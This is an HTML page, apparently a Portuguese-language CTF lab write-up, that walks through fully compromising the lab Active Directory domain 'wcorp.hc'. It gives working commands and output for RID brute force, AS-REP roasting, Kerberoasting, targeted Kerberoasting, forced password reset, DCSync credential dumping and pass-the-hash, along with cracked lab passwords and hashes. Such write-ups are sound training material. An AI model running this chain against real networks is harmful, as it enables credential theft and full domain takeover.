@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>WCorp - HC // 0x404</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --black:    #000408;
+      --panel:    #010d1a;
+      --cyan:     #00d4ff;
+      --cyan2:    #00aacc;
+      --cyan-dim: #004455;
+      --orange:   #ff6600;
+      --white:    #e0f7ff;
+      --muted:    #3a7a8a;
+      --green:    #44ff88;
+      --purple:   #cc88ff;
+      --red:      #ff4466;
+      --ff-title: 'Orbitron', monospace;
+      --ff-mono:  'Share Tech Mono', monospace;
+      --glow-sm:  0 0 8px #00d4ff88;
+      --glow-md:  0 0 16px #00d4ffaa, 0 0 32px #00d4ff44;
+    }
+    html { scroll-behavior: smooth; }
+    body { background: var(--black); color: var(--white); font-family: var(--ff-mono); font-size: 15px; line-height: 1.8; overflow-x: hidden; }
+    .grid-bg {
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      background-image: linear-gradient(var(--cyan-dim) 1px, transparent 1px), linear-gradient(90deg, var(--cyan-dim) 1px, transparent 1px);
+      background-size: 48px 48px; opacity: 0.15;
+      mask-image: radial-gradient(ellipse 80% 80% at 50% 50%, black 40%, transparent 100%);
+    }
+    .scanlines { position: fixed; inset: 0; z-index: 1; pointer-events: none; background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,0,0,0.07) 2px, rgba(0,0,0,0.07) 4px); }
+    .vignette { position: fixed; inset: 0; z-index: 2; pointer-events: none; background: radial-gradient(ellipse at center, transparent 50%, #000408bb 100%); }
+
+    nav { position: sticky; top: 0; z-index: 100; border-bottom: 1px solid var(--cyan-dim); background: rgba(0,4,8,0.94); backdrop-filter: blur(12px); }
+    .nav-inner { max-width: 900px; margin: 0 auto; padding: 0 32px; display: flex; align-items: stretch; justify-content: space-between; height: 52px; }
+    .nav-logo { font-family: var(--ff-title); font-size: 14px; font-weight: 700; color: var(--cyan); text-decoration: none; letter-spacing: 0.15em; text-shadow: var(--glow-sm); display: flex; align-items: center; border-right: 1px solid var(--cyan-dim); padding-right: 24px; }
+    .nav-logo .slash { color: var(--orange); }
+    .nav-back { display: flex; align-items: center; gap: 8px; color: var(--muted); text-decoration: none; font-size: 11px; letter-spacing: 0.14em; text-transform: uppercase; transition: color .2s; }
+    .nav-back:hover { color: var(--cyan); }
+    .nav-back::before { content: '←'; font-size: 14px; }
+
+    .page { position: relative; z-index: 10; max-width: 900px; margin: 0 auto; padding: 0 32px; }
+
+    /* HEADER */
+    .wu-header { padding: 64px 0 48px; border-bottom: 1px solid var(--cyan-dim); margin-bottom: 48px; }
+    .wu-meta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-bottom: 20px; }
+    .wu-cat { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; padding: 4px 12px; border: 1px solid; }
+    .cat-ad { border-color: #ff660055; color: var(--orange); }
+    .wu-date { font-size: 12px; color: var(--muted); letter-spacing: 0.08em; }
+    .wu-diff { font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.12em; padding: 4px 12px; border: 1px solid; }
+    .diff-hard { border-color: #ff446655; color: var(--red); }
+    .wu-title { font-family: var(--ff-title); font-size: clamp(24px, 4vw, 40px); font-weight: 900; letter-spacing: 0.04em; line-height: 1.2; color: var(--cyan); text-shadow: var(--glow-md); margin-bottom: 16px; }
+    .wu-desc { font-size: 14px; color: var(--muted); max-width: 640px; line-height: 1.8; margin-bottom: 24px; }
+    .wu-tags { display: flex; flex-wrap: wrap; gap: 6px; margin-bottom: 28px; }
+    .tag { font-size: 11px; color: var(--muted); padding: 3px 10px; border: 1px solid #ffffff0f; background: rgba(255,255,255,0.02); }
+    .wu-infobar { display: flex; flex-wrap: wrap; gap: 2px; border: 1px solid var(--cyan-dim); }
+    .wu-infobar-item { padding: 10px 20px; background: var(--panel); display: flex; flex-direction: column; gap: 2px; flex: 1; min-width: 120px; }
+    .wi-label { font-size: 10px; color: var(--muted); letter-spacing: 0.1em; text-transform: uppercase; }
+    .wi-value { font-family: var(--ff-title); font-size: 13px; font-weight: 700; color: var(--cyan); letter-spacing: 0.06em; }
+
+    /* TOC */
+    .toc { background: var(--panel); border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); padding: 24px 28px; margin-bottom: 48px; }
+    .toc-title { font-family: var(--ff-title); font-size: 11px; font-weight: 700; letter-spacing: 0.15em; text-transform: uppercase; color: var(--orange); margin-bottom: 14px; }
+    .toc ol { list-style: none; counter-reset: toc; }
+    .toc li { counter-increment: toc; padding: 5px 0; border-bottom: 1px solid #ffffff06; }
+    .toc li:last-child { border-bottom: none; }
+    .toc a { color: var(--muted); text-decoration: none; font-size: 13px; display: flex; align-items: center; gap: 10px; transition: color .2s; }
+    .toc a::before { content: counter(toc, decimal-leading-zero) '.'; font-family: var(--ff-title); font-size: 10px; color: var(--cyan-dim); min-width: 28px; }
+    .toc a:hover { color: var(--cyan); }
+
+    /* CONTENT */
+    .wu-content { max-width: 760px; }
+    .wu-content h2 { font-family: var(--ff-title); font-weight: 700; font-size: 17px; letter-spacing: 0.08em; text-transform: uppercase; color: var(--cyan); text-shadow: var(--glow-sm); margin: 56px 0 20px; padding-bottom: 10px; border-bottom: 1px solid var(--cyan-dim); display: flex; align-items: center; gap: 12px; }
+    .wu-content h2::before { content: '//'; color: var(--orange); font-size: 14px; }
+    .wu-content h3 { font-family: var(--ff-title); font-size: 13px; font-weight: 700; letter-spacing: 0.1em; color: var(--cyan2); margin: 32px 0 14px; }
+    .wu-content h3::before { content: '> '; color: var(--muted); }
+    .wu-content p { color: #8ab4be; margin-bottom: 14px; line-height: 1.85; }
+    .wu-content strong { color: var(--white); font-weight: 700; }
+    .wu-content em { color: #aaccdd; font-style: italic; }
+    .wu-content a { color: var(--cyan2); text-decoration: none; }
+    .wu-content a:hover { color: var(--cyan); text-shadow: var(--glow-sm); }
+    .wu-content code { font-family: var(--ff-mono); font-size: 13px; color: var(--orange); background: rgba(255,102,0,0.08); padding: 2px 7px; border: 1px solid rgba(255,102,0,0.2); }
+    .wu-content pre { background: #000d16; border: 1px solid var(--cyan-dim); border-left: 3px solid var(--cyan); margin: 20px 0; overflow-x: auto; position: relative; }
+    .wu-content pre .lang-label { display: block; padding: 6px 16px; background: var(--panel); border-bottom: 1px solid var(--cyan-dim); font-family: var(--ff-title); font-size: 9px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan2); text-transform: uppercase; }
+    .wu-content pre code { display: block; padding: 18px 20px; background: transparent; border: none; color: #7ecfbf; font-size: 13px; line-height: 1.7; white-space: pre-wrap; word-break: break-all; }
+    .wu-content ul { padding-left: 0; margin-bottom: 14px; list-style: none; }
+    .wu-content ul li { color: #8ab4be; padding: 3px 0 3px 22px; position: relative; }
+    .wu-content ul li::before { content: '▸'; position: absolute; left: 0; color: var(--cyan); font-size: 10px; top: 6px; }
+    .wu-content figure { margin: 28px 0; }
+    .wu-content figure img { max-width: 100%; display: block; border: 1px solid var(--cyan-dim); transition: border-color .2s; }
+    .wu-content figure img:hover { border-color: var(--cyan2); }
+
+    /* Attack Chain */
+    .attack-chain { display: flex; align-items: center; flex-wrap: wrap; gap: 0; margin: 32px 0; }
+    .ac-step { background: var(--panel); border: 1px solid var(--cyan-dim); padding: 10px 16px; font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.08em; color: var(--cyan2); text-align: center; flex: 1; min-width: 100px; }
+    .ac-step.highlight { border-color: var(--orange); color: var(--orange); }
+    .ac-arrow { color: var(--cyan-dim); font-size: 18px; padding: 0 4px; }
+
+    /* Callouts */
+    .callout-flag { background: rgba(255,68,102,0.06); border: 1px solid rgba(255,68,102,0.3); border-left: 3px solid var(--red); padding: 16px 20px; margin: 20px 0; }
+    .callout-flag .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--red); margin-bottom: 8px; }
+    .callout-flag p { color: #cc6688; margin: 0; }
+    .callout-flag code { color: var(--red); background: rgba(255,68,102,0.1); border-color: rgba(255,68,102,0.3); }
+    .callout-tip { background: rgba(68,255,136,0.04); border: 1px solid rgba(68,255,136,0.2); border-left: 3px solid var(--green); padding: 16px 20px; margin: 20px 0; }
+    .callout-tip .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--green); margin-bottom: 8px; }
+    .callout-tip p { color: #44aa66; margin: 0; }
+    .callout-info { background: rgba(0,212,255,0.04); border: 1px solid rgba(0,212,255,0.2); border-left: 3px solid var(--cyan); padding: 16px 20px; margin: 20px 0; }
+    .callout-info .cf-title { font-family: var(--ff-title); font-size: 10px; font-weight: 700; letter-spacing: 0.15em; color: var(--cyan); margin-bottom: 8px; }
+    .callout-info p { color: #3a7a8a; margin: 0; }
+    .callout-info code { color: var(--cyan2); }
+
+    footer { border-top: 1px solid var(--cyan-dim); padding: 32px 0; margin-top: 40px; display: flex; justify-content: space-between; align-items: center; font-size: 11px; color: var(--muted); letter-spacing: 0.08em; }
+    .status-dot { width: 6px; height: 6px; background: var(--green); border-radius: 50%; box-shadow: 0 0 8px var(--green); display: inline-block; margin-right: 8px; animation: pulse 2s ease-in-out infinite; }
+    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }
+  </style>
+</head>
+<body>
+<div class="grid-bg"></div>
+<div class="scanlines"></div>
+<div class="vignette"></div>
+
+<nav>
+  <div class="nav-inner">
+    <a href="../index.html" class="nav-logo">0x404</a>
+    <a href="../index.html" class="nav-back">Voltar</a>
+  </div>
+</nav>
+
+<div class="page">
+
+  <header class="wu-header">
+    <div class="wu-meta">
+      <span class="wu-cat cat-ad">Active Directory</span>
+      <span class="wu-date">ABR 2025</span>
+      <span class="wu-diff diff-hard">HARD</span>
+    </div>
+    <h1 class="wu-title">WCorp — HC</h1>
+    <p class="wu-desc">
+      Comprometimento completo de domínio Active Directory via AS-REP Roasting, Kerberoasting, Targeted Kerberoasting,
+      ForceChangePassword e DCSync. Cadeia de ataque partindo de acesso anônimo SMB até Administrator.
+    </p>
+    <div class="wu-tags">
+      <span class="tag">AS-REP Roasting</span>
+      <span class="tag">Kerberoasting</span>
+      <span class="tag">IDOR</span>
+      <span class="tag">GenericWrite</span>
+      <span class="tag">ForceChangePassword</span>
+      <span class="tag">DCSync</span>
+      <span class="tag">BloodHound</span>
+      <span class="tag">Windows AD</span>
+    </div>
+    <div class="wu-infobar">
+      <div class="wu-infobar-item">
+        <span class="wi-label">Plataforma</span>
+        <span class="wi-value">HackClub</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">OS</span>
+        <span class="wi-value">Windows</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">IP Alvo</span>
+        <span class="wi-value">172.16.11.181</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Domínio</span>
+        <span class="wi-value">wcorp.hc</span>
+      </div>
+      <div class="wu-infobar-item">
+        <span class="wi-label">Data</span>
+        <span class="wi-value">19 ABR 2025</span>
+      </div>
+    </div>
+  </header>
+
+  <nav class="toc">
+    <div class="toc-title">// Índice</div>
+    <ol>
+      <li><a href="#recon">Information Gathering — Portscan</a></li>
+      <li><a href="#smb">Enumeração SMB & RID Brute Force</a></li>
+      <li><a href="#asrep">AS-REP Roasting — svc_backup</a></li>
+      <li><a href="#kerberoast">Kerberoasting — svc_web</a></li>
+      <li><a href="#targeted">Targeted Kerberoasting — john.doe</a></li>
+      <li><a href="#forcechange">ForceChangePassword — diana.ops</a></li>
+      <li><a href="#dcsync">DCSync & Acesso ao Administrator</a></li>
+    </ol>
+  </nav>
+
+  <!-- ATTACK CHAIN -->
+  <div class="attack-chain">
+    <div class="ac-step">Guest SMB</div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">svc_backup<br><small>AS-REP</small></div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">svc_web<br><small>Kerberoast</small></div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">john.doe<br><small>GenericWrite</small></div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step">diana.ops<br><small>ForceChangePwd</small></div>
+    <span class="ac-arrow">→</span>
+    <div class="ac-step highlight">Administrator<br><small>DCSync</small></div>
+  </div>
+
+  <div class="wu-content">
+
+    <h2 id="recon">Information Gathering</h2>
+
+    <h3>Portscan</h3>
+    <p>Iniciamos com a enumeração de portas e serviços ativos no ambiente alvo.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ bash ~/tools/enumport/script.sh 172.16.11.181
+Enumerando portas....
+Portas abertas: 53,88,135,139,389,445,593,636,3269,3389,5985,9389,...
+Verificando Serviços
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP
+                              (Domain: wcorp.hc0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (WinRM)
+| rdp-ntlm-info:
+|   Target_Name: WCORP
+|   DNS_Domain_Name: wcorp.hc
+|   DNS_Computer_Name: dc-01.wcorp.hc
+|_  Product_Version: 10.0.20348
+
+Nmap done: 1 IP address (1 host up) scanned in 110.29 seconds</code></pre>
+
+    <p><strong>Obs</strong>: Script personalizado de enumeração: <a href="https://github.com/fstringuetta/enumport" target="_blank">github.com/fstringuetta/enumport</a></p>
+
+    <h3>Configuração do arquivo hosts</h3>
+    <pre><span class="lang-label">bash</span><code>$ echo '172.16.11.181 wcorp.hc dc-01.wcorp.hc' | sudo tee -a /etc/hosts</code></pre>
+
+    <h2 id="smb">Enumeração SMB & RID Brute Force</h2>
+
+    <p>Com o SMB ativo, realizamos tentativa de acesso com credenciais de convidado para identificar permissões indevidas em compartilhamentos.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u guest -p '' --shares
+SMB  172.16.11.181  445  DC-01  [+] wcorp.hc\guest:
+SMB  172.16.11.181  445  DC-01  Share        Permissions  Remark
+SMB  172.16.11.181  445  DC-01  -----        -----------  ------
+SMB  172.16.11.181  445  DC-01  ADMIN$                    Remote Admin
+SMB  172.16.11.181  445  DC-01  C$                        Default share
+SMB  172.16.11.181  445  DC-01  IPC$         READ         Remote IPC
+SMB  172.16.11.181  445  DC-01  NETLOGON                  Logon server share
+SMB  172.16.11.181  445  DC-01  SYSVOL                    Logon server share</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ RID Brute Force</div>
+      <p>A conta <code>guest</code> está habilitada com permissão de leitura no IPC$. Isso permite enumerar usuários do domínio via RID Brute Forcing com o parâmetro <code>--rid-brute</code>.</p>
+    </div>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u 'guest' -p '' --rid-brute 2>/dev/null \
+  | grep 'SidTypeUser' | awk -F '\\' '{print $2}' | awk '{print $1}'
+
+Administrator
+Guest
+krbtgt
+DC-01$
+john.doe
+alice.hr
+bob.finance
+charlie.dev
+diana.ops
+svc_backup
+svc_web</code></pre>
+
+    <figure><img src="imgs/2025-04-19_19-55.png" alt="RID Brute Force enumerando usuários do domínio" /></figure>
+
+    <h2 id="asrep">AS-REP Roasting — svc_backup</h2>
+
+    <p>Com a lista de usuários em mãos, identificamos duas contas de serviço: <code>svc_backup</code> e <code>svc_web</code>. Verificamos a presença da flag <strong>Do not require Kerberos preauthentication</strong> usando o <code>GetNPUsers.py</code> do Impacket.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ GetNPUsers.py wcorp.hc/guest -no-pass -dc-ip 172.16.11.181 \
+  -usersfile users.txt -outputfile hashes
+
+[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User john.doe doesn't have UF_DONT_REQUIRE_PREAUTH set
+[-] User diana.ops doesn't have UF_DONT_REQUIRE_PREAUTH set
+$krb5asrep$23$svc_backup@WCORP.HC:d1c7e43b9d22ee883593a84c4c26a64a$...
+[-] User svc_web doesn't have UF_DONT_REQUIRE_PREAUTH set</code></pre>
+
+    <p>Hash AS-REP obtido para <code>svc_backup</code>! Executamos o ataque de força bruta com John:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep hashes-krb5
+
+LuvinJames&lt;3     ($krb5asrep$23$svc_backup@WCORP.HC)
+1g 0:00:00:14 DONE (2025-04-19 17:29) 0.07017g/s 764874p/s</code></pre>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ Credenciais Obtidas</div>
+      <p><code>svc_backup</code> : <code>LuvinJames&lt;3</code></p>
+    </div>
+
+    <figure><img src="imgs/image.png" alt="Validação das credenciais svc_backup com netexec" /></figure>
+
+    <p>Com as credenciais validadas, enumeramos todos os usuários do AD e obtemos a <strong>primeira evidência</strong>.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u 'svc_backup' -p 'LuvinJames&lt;3' --users</code></pre>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Flag 1 — User Flag</div>
+      <p>Obtida via enumeração de usuários com <code>svc_backup</code></p>
+    </div>
+
+    <h2 id="kerberoast">Kerberoasting — svc_web</h2>
+
+    <p>Executamos o ingestor do BloodHound para mapear o domínio e identificar caminhos de escalada.</p>
+
+    <pre><span class="lang-label">bash</span><code>$ bloodhound-python --zip -c All -d wcorp.hc \
+  -u 'svc_backup' -p 'LuvinJames&lt;3' \
+  -dc dc-01.wcorp.hc -ns 172.16.11.181
+
+INFO: Found 1 domains | Found 11 users | Found 53 groups
+INFO: Compressing output into 20250419205634_bloodhound.zip</code></pre>
+
+    <figure><img src="imgs/image 1.png" alt="BloodHound mostrando caminho de ataque" /></figure>
+
+    <p>O BloodHound revelou que seria necessário comprometer <code>svc_web</code>. Verificamos a existência de SPNs associados:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ GetUserSPNs.py wcorp.hc/svc_backup:'LuvinJames&lt;3' -dc-ip 172.16.11.181
+
+ServicePrincipalName  Name     PasswordLastSet              LastLogon
+--------------------  -------  ---------------------------  --------------------------
+HTTP/app01.wcorp.hc   svc_web  2025-04-17 03:55:21.770126  2025-04-19 18:20:46.842080</code></pre>
+
+    <p>SPN confirmado — executamos o Kerberoasting para obter o TGS:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ GetUserSPNs.py wcorp.hc/svc_backup:'LuvinJames&lt;3' -dc-ip 172.16.11.181 -request
+
+$krb5tgs$23$*svc_web$WCORP.HC$wcorp.hc/svc_web*$928e2188409c8fe6d3ef600530ab7ed9$...</code></pre>
+
+    <pre><span class="lang-label">bash</span><code>$ john -w=/usr/share/wordlists/rockyou.txt hash-svc-web --format=krb5tgs
+
+J&J=1331ch       (?)
+1g 0:00:00:15 DONE (2025-04-19 21:12)</code></pre>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ Credenciais Obtidas</div>
+      <p><code>svc_web</code> : <code>J&amp;J=1331ch</code></p>
+    </div>
+
+    <h2 id="targeted">Targeted Kerberoasting — john.doe</h2>
+
+    <p>Nova análise no BloodHound com as credenciais de <code>svc_web</code> revelou permissão <strong>GenericWrite</strong> sobre o usuário <code>john.doe</code>.</p>
+
+    <figure><img src="imgs/image 2.png" alt="BloodHound mostrando GenericWrite de svc_web sobre john.doe" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ GenericWrite → Targeted Kerberoasting</div>
+      <p>A permissão <code>GenericWrite</code> permite modificar atributos como <code>servicePrincipalName</code>. Adicionando um SPN falso ao objeto alvo, forçamos o KDC a emitir um TGS que pode ser quebrado offline.</p>
+    </div>
+
+    <pre><span class="lang-label">bash</span><code>$ python3 ~/tools/targetedKerberoast/targetedKerberoast.py \
+  -v -d 'wcorp.hc' -u 'svc_web' -p 'J&J=1331ch'
+
+[VERBOSE] SPN added successfully for (john.doe)
+[+] Printing hash for (john.doe)
+$krb5tgs$23$*john.doe$WCORP.HC$wcorp.hc/john.doe*$939e53611c683c816214a9c0ad74eaf8$...</code></pre>
+
+    <p>Link de referência: <a href="https://github.com/ShutdownRepo/targetedKerberoast" target="_blank">ShutdownRepo/targetedKerberoast</a></p>
+
+    <pre><span class="lang-label">bash</span><code>$ john -w=/opt/SecLists/Passwords/xato-net-10-million-passwords.txt \
+  hash-john --format=krb5tgs
+
+Welcome01!       (?)
+1g 0:00:00:03 DONE (2025-04-19 21:31)</code></pre>
+
+    <div class="callout-tip">
+      <div class="cf-title">✓ Credenciais Obtidas</div>
+      <p><code>john.doe</code> : <code>Welcome01!</code></p>
+    </div>
+
+    <h2 id="forcechange">ForceChangePassword — diana.ops</h2>
+
+    <p>Análise no BloodHound com as credenciais de <code>john.doe</code> revelou o privilégio <strong>ForceChangePassword</strong> sobre a conta <code>diana.ops</code>.</p>
+
+    <figure><img src="imgs/image 3.png" alt="BloodHound mostrando ForceChangePassword de john.doe sobre diana.ops" /></figure>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ ForceChangePassword</div>
+      <p>Permite alterar a senha de outro objeto no AD <strong>sem precisar conhecer a senha atual</strong>. Viabiliza movimentação lateral e escalada de privilégios.</p>
+    </div>
+
+    <pre><span class="lang-label">bash</span><code>$ net rpc password "diana.ops" "newP@ssword2025" \
+  -U "wcorp.dc"/"john.doe"%"Welcome01!" -S "172.16.11.181"</code></pre>
+
+    <p>Validando a troca de senha:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ netexec smb 172.16.11.181 -u diana.ops -p 'newP@ssword2025'
+SMB  172.16.11.181  445  DC-01  [+] wcorp.hc\diana.ops:newP@ssword2025</code></pre>
+
+    <h2 id="dcsync">DCSync & Acesso ao Administrator</h2>
+
+    <p>Com a conta <code>diana.ops</code> comprometida e confirmada sua permissão <strong>DCSync</strong>, executamos o <code>secretsdump.py</code> para replicar as credenciais de todo o domínio.</p>
+
+    <figure><img src="imgs/image 4.png" alt="BloodHound mostrando DCSync de diana.ops" /></figure>
+
+    <pre><span class="lang-label">bash</span><code>$ secretsdump.py wcorp.hc/diana.ops:'newP@ssword2025'@172.16.11.181
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:bca93a964b13304c96a364e8d59ce3cb:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cc714fd2703f917adcfc0aa3555917a4:::
+wcorp.hc\john.doe:1103:::a59cc2e81b2835c6b402634e584a8edc:::
+wcorp.hc\svc_backup:1108:::22221aa9489a9fa9996434260acdb6be:::
+wcorp.hc\svc_web:1109:::232a3f9ae310b39473cd157a270d80d6:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:8ee821d1e116cb434d87263887bdb5ed587572e904d2bf0d7da3b8d07c43927a
+[*] Cleaning up...</code></pre>
+
+    <div class="callout-info">
+      <div class="cf-title">ℹ DCSync</div>
+      <p>Simula o comportamento de um Domain Controller solicitando replicação de dados do AD via protocolo <code>MS-DRSR</code>, extraindo hashes NTLM e chaves Kerberos de todas as contas do domínio.</p>
+    </div>
+
+    <p>Com o hash NTLM do <code>Administrator</code> em mãos, estabelecemos sessão via WinRM usando Pass-the-Hash:</p>
+
+    <pre><span class="lang-label">bash</span><code>$ evil-winrm -i 172.16.11.181 -u Administrator \
+  -H bca93a964b13304c96a364e8d59ce3cb
+
+Evil-WinRM shell v3.5
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+wcorp\administrator</code></pre>
+
+    <figure><img src="imgs/image 5.png" alt="Shell como Administrator via Evil-WinRM" /></figure>
+
+    <div class="callout-flag">
+      <div class="cf-title">🚩 Root Flag</div>
+      <p>Obtida em <code>C:\Users\Administrator\Desktop\root.txt</code></p>
+    </div>
+
+  </div>
+
+  <footer>
+    <div><span class="status-dot"></span>fstringuetta.github.io</div>
+    <span>© 2025 · fstringuetta</span>
+  </footer>
+
+</div>
+
+<script>
+  document.addEventListener('mousemove', e => {
+    const x = (e.clientX / window.innerWidth - 0.5) * 14;
+    const y = (e.clientY / window.innerHeight - 0.5) * 14;
+    document.querySelector('.grid-bg').style.transform = `translate(${x}px, ${y}px)`;
+  });
+</script>
+</body>
+</html>
